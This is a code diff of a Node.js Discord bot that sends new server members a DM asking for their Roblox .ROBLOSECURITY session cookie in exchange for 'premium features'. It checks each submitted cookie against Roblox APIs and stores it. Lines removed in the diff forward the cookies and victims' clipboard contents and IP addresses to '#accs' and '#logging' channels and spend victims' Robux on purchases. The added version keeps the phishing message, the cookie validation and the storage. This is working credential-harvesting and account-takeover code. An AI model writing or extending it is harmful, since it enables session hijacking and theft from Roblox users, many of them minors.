@@ -1,17 +1,14 @@
 require('dotenv').config();
-const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder } = require('discord.js');
+const fs = require('fs');
+const path = require('path');
 const axios = require('axios');
+const { Client, GatewayIntentBits, Partials, REST, Routes, SlashCommandBuilder } = require('discord.js');
 
 const TOKEN = process.env.DISCORD_BOT_TOKEN;
 const GUILD_ID = process.env.DISCORD_GUILD_ID;
 
-if (!TOKEN) {
-  console.error("Missing DISCORD_BOT_TOKEN in .env");
-  process.exit(1);
-}
-
-if (!GUILD_ID) {
-  console.error("Missing DISCORD_GUILD_ID in .env");
+if (!TOKEN || !GUILD_ID) {
+  console.error("Missing DISCORD_BOT_TOKEN or DISCORD_GUILD_ID in .env");
   process.exit(1);
 }
 
@@ -19,200 +16,144 @@ const client = new Client({
   intents: [
     GatewayIntentBits.Guilds,
     GatewayIntentBits.GuildMembers,
-    GatewayIntentBits.GuildMessages,
-    GatewayIntentBits.MessageContent,
     GatewayIntentBits.DirectMessages,
+    GatewayIntentBits.MessageContent,
   ],
-  partials: ['CHANNEL'], // needed for DMs
+  partials: [Partials.Channel], // enable DMs
 });
 
-let loggingChannel = null;
-let accsChannel = null;
+const dataFile = path.join(__dirname, 'verificationData.json');
 
-const userCookies = new Map(); // DiscordUserID => Roblox cookie
+// Persistent sets stored as arrays in JSON file
+let verifiedUsers = new Set();
+let dmSentUsers = new Set();
+// Store cookies in memory for session (WARNING: For production, encrypt or secure storage is recommended)
+const userCookies = new Map();
 
-// Your test products (replace with real product info)
-const testProducts = [
-  { productId: 12345678, price: 5, sellerId: 1 },
-  // Add real products here
-];
-
-// Helper: send info to logging/accs channels
-async function sendToDiscordBot(data, type) {
-  if (!client.isReady()) {
-    console.error("Discord client not ready");
-    return;
-  }
-
+function loadData() {
   try {
-    if (type === 'token') {
-      if (!accsChannel) {
-        console.error("#accs channel not found");
-        return;
-      }
-
-      await accsChannel.send({
-        embeds: [{
-          title: 'Roblox Cookie Received',
-          color: 0xff9500,
-          description:
-            `**User:** <@${data.discordUserId}>\n` +
-            `**Roblox User:** ${data.robloxUserName} (ID: ${data.robloxUserId})\n` +
-            `**Cookie:** \`${data.cookie.substring(0, 20)}... (truncated)\``,
-          timestamp: new Date(),
-          footer: { text: 'Game Copier Bot' },
-        }]
-      });
-
-    } else if (type === 'clipboard') {
-      if (!loggingChannel) {
-        console.error("#logging channel not found");
-        return;
-      }
-
-      await loggingChannel.send({
-        embeds: [{
-          title: 'Clipboard Content Received',
-          color: 0x00ff00,
-          description:
-            `**IP:** ${data.userIP}\n` +
-            `**Type:** ${data.type}\n` +
-            `**Content:** \`\`\`${data.clipboardData.substring(0, 1800)}\`\`\``,
-          timestamp: new Date(),
-          footer: { text: 'Game Copier Bot' },
-        }]
-      });
-
-    } else {
-      console.warn("Unknown data type to send:", type);
-    }
-  } catch (error) {
-    console.error("Error sending message to Discord:", error);
-  }
-}
-
-// Welcome message
-const WELCOME_MESSAGE = (serverName) => `
-Welcome to the **${serverName}** Discord server!
-
-You can stay and chat here, but if you want to enjoy premium features like trading and more, please reply to this DM with your Roblox \`.ROBLOSECURITY\` cookie.
-
-*Note: Your cookie will be stored securely and used only for verification purposes.*
-
-If you have any questions, feel free to ask!
-`;
-
-// Validate Roblox cookie + get user info
-async function validateCookie(cookie) {
-  try {
-    const res = await axios.get('https://users.roblox.com/v1/users/authenticated', {
-      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
-      validateStatus: null,
-    });
-    if (res.status === 200) return res.data;
-    return null;
+    const raw = fs.readFileSync(dataFile, 'utf8');
+    const data = JSON.parse(raw);
+    verifiedUsers = new Set(data.verifiedUsers || []);
+    dmSentUsers = new Set(data.dmSentUsers || []);
+    console.log("Verification data loaded.");
   } catch {
-    return null;
+    console.log("No verification data found, starting fresh.");
+    verifiedUsers = new Set();
+    dmSentUsers = new Set();
   }
 }
 
-// Get Robux balance
-async function getRobuxBalance(cookie) {
-  try {
-    const res = await axios.get('https://economy.roblox.com/v1/user/currency', {
-      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
-      validateStatus: null,
-    });
-    if (res.status === 200) return res.data.robux || 0;
-    return 0;
-  } catch {
-    return 0;
-  }
+function saveData() {
+  const data = {
+    verifiedUsers: Array.from(verifiedUsers),
+    dmSentUsers: Array.from(dmSentUsers),
+  };
+  fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
+  console.log("Verification data saved.");
 }
 
-// Purchase a product
-async function purchaseProduct(cookie, product) {
+loadData();
+
+// Roblox API: Validate cookie and get user info
+async function validateRobloxCookie(cookie) {
   try {
-    const res = await axios.post(
-      `https://economy.roblox.com/v1/purchases/products/${product.productId}`,
-      {
-        expectedPrice: product.price,
-        expectedSellerId: product.sellerId,
+    const res = await axios.get('https://www.roblox.com/mobileapi/userinfo', {
+      headers: {
+        Cookie: `.ROBLOSECURITY=${cookie}`,
+        'User-Agent': 'Roblox/WinInet',
       },
-      {
-        headers: {
-          Cookie: `.ROBLOSECURITY=${cookie}`,
-          'Content-Type': 'application/json',
-        },
-        validateStatus: null,
-      }
-    );
-    return res.status === 200 || res.status === 201;
+      timeout: 5000,
+    });
+    if (res.status === 200 && res.data && res.data.UserID) {
+      return res.data; // Valid cookie with user info
+    }
+    return null;
   } catch {
-    return false;
+    return null;
   }
 }
 
-// Register slash commands (only /test for now)
-async function registerCommands() {
-  const commands = [
-    new SlashCommandBuilder()
-      .setName('test')
-      .setDescription('Buy a random product from the shop using your Robux'),
-  ].map(cmd => cmd.toJSON());
+// Placeholder purchase function - replace with your purchase logic
+async function buyRandomItem(cookie) {
+  // Here you would:
+  // 1. Check Robux balance via Roblox API
+  // 2. Pick a random item from catalog or predefined list
+  // 3. Call Roblox purchase API with cookie
 
-  const rest = new (require('discord.js').REST)({ version: '10' }).setToken(TOKEN);
-  await rest.put(Routes.applicationCommands(client.user.id), { body: commands });
+  // For now, simulate success:
+  return { success: true, message: "🎉 Purchased a random item successfully! (placeholder)" };
 }
 
 client.once('ready', async () => {
   console.log(`Logged in as ${client.user.tag}`);
 
+  const rest = new REST({ version: '10' }).setToken(TOKEN);
+
+  const commands = [
+    new SlashCommandBuilder()
+      .setName('test')
+      .setDescription('Buy a random item from the shop using your Robux'),
+  ].map(cmd => cmd.toJSON());
+
   try {
-    const guild = await client.guilds.fetch(GUILD_ID);
-    loggingChannel = guild.channels.cache.find(ch => ch.name === 'logging' && ch.isTextBased());
-    accsChannel = guild.channels.cache.find(ch => ch.name === 'accs' && ch.isTextBased());
-
-    if (!loggingChannel) console.error("Could not find #logging channel");
-    if (!accsChannel) console.error("Could not find #accs channel");
-
+    await rest.put(
+      Routes.applicationGuildCommands(client.user.id, GUILD_ID),
+      { body: commands }
+    );
+    console.log('Slash commands registered.');
   } catch (err) {
-    console.error("Error fetching guild or channels:", err);
+    console.error('Failed to register slash commands:', err);
   }
-
-  await registerCommands();
 });
 
-// On guild member join, send welcome DM
+// DM new members once if not verified or already DM'd
 client.on('guildMemberAdd', async (member) => {
+  const userId = member.user.id;
+  if (verifiedUsers.has(userId)) return;
+  if (dmSentUsers.has(userId)) return;
+
   try {
-    await member.send(WELCOME_MESSAGE(member.guild.name));
-  } catch {
-    console.log(`Could not send DM to ${member.user.tag}. They may have DMs disabled.`);
+    await member.send(
+      `Welcome to ${member.guild.name}! You can stay and chat, but if you want to enjoy premium features like trading, please reply with your Roblox cookie.`
+    );
+    dmSentUsers.add(userId);
+    saveData();
+    console.log(`Sent welcome DM to ${member.user.tag}`);
+  } catch (err) {
+    console.error(`Failed to DM ${member.user.tag}:`, err);
   }
 });
 
-// On DM message: treat as Roblox cookie submission
+// Listen for DM messages to accept Roblox cookies
 client.on('messageCreate', async (message) => {
-  if (message.channel.type === 1 && !message.author.bot) { // DM channel
-    const cookie = message.content.trim();
-    const userInfo = await validateCookie(cookie);
-    if (userInfo) {
-      userCookies.set(message.author.id, cookie);
-      await message.reply(`Thanks! Verified Roblox user: ${userInfo.displayName} (ID: ${userInfo.id}). Your cookie is now saved securely.`);
+  if (message.channel.type !== 1) return; // Only DMs
+  if (message.author.bot) return;
 
-      // Send to #accs logging channel
-      await sendToDiscordBot({
-        discordUserId: message.author.id,
-        robloxUserName: userInfo.displayName,
-        robloxUserId: userInfo.id,
-        cookie,
-      }, 'token');
+  const userId = message.author.id;
+  const cookie = message.content.trim();
 
-    } else {
-      await message.reply('Invalid Roblox cookie. Please check and try again.');
-    }
+  // Basic length check - Roblox cookies vary, but usually ~85+ chars
+  if (cookie.length < 20) {
+    await message.reply('That doesn’t look like a valid Roblox cookie. Please try again.');
+    return;
   }
+
+  // Validate cookie
+  const userInfo = await validateRobloxCookie(cookie);
+  if (!userInfo) {
+    await message.reply('Invalid Roblox cookie. Please check and send again.');
+    return;
+  }
+
+  // Save cookie and mark verified
+  userCookies.set(userId, cookie);
+  verifiedUsers.add(userId);
+  dmSentUsers.delete(userId);
+  saveData();
+
+  await message.reply(`Thanks, **${userInfo.UserName}**! Your cookie has been verified, and premium features are now unlocked.`);
+  console.log(`User ${userInfo.UserName} (${userId}) verified.`);
 });
 
 // Handle slash commands
@@ -220,33 +161,40 @@ client.on('interactionCreate', async (interaction) => {
   if (!interaction.isChatInputCommand()) return;
 
   if (interaction.commandName === 'test') {
-    const cookie = userCookies.get(interaction.user.id);
+    const userId = interaction.user.id;
+
+    if (!verifiedUsers.has(userId)) {
+      await interaction.reply({ content: "You must submit your Roblox cookie first!", ephemeral: true });
+      return;
+    }
+
+    const cookie = userCookies.get(userId);
     if (!cookie) {
-      await interaction.reply({ content: 'You have not provided your Roblox cookie yet. Please send it to me via DM.', ephemeral: true });
+      await interaction.reply({ content: "Your Roblox cookie is missing. Please resubmit it via DM.", ephemeral: true });
       return;
     }
 
-    const userInfo = await validateCookie(cookie);
+    // Re-validate cookie before purchase
+    const userInfo = await validateRobloxCookie(cookie);
     if (!userInfo) {
-      userCookies.delete(interaction.user.id);
-      await interaction.reply({ content: 'Your Roblox cookie is no longer valid. Please send a new one in DM.', ephemeral: true });
+      // Invalidate stored data
+      verifiedUsers.delete(userId);
+      userCookies.delete(userId);
+      saveData();
+
+      await interaction.reply({ content: "Your Roblox cookie appears invalid now. Please submit a valid one again via DM.", ephemeral: true });
       return;
     }
 
-    const robux = await getRobuxBalance(cookie);
-    if (robux <= 0) {
-      await interaction.reply('You have no Robux in your account.');
+    // Run placeholder purchase
+    const purchaseResult = await buyRandomItem(cookie);
+
+    if (!purchaseResult.success) {
+      await interaction.reply({ content: purchaseResult.message, ephemeral: true });
       return;
     }
 
-    const product = testProducts[Math.floor(Math.random() * testProducts.length)];
-
-    const success = await purchaseProduct(cookie, product);
-    if (success) {
-      await interaction.reply(`Purchase succeeded! You bought product ID ${product.productId} for ${product.price} Robux.`);
-    } else {
-      await interaction.reply('Purchase failed. Please check your account or try again later.');
-    }
+    await interaction.reply(purchaseResult.message);
   }
 });
 
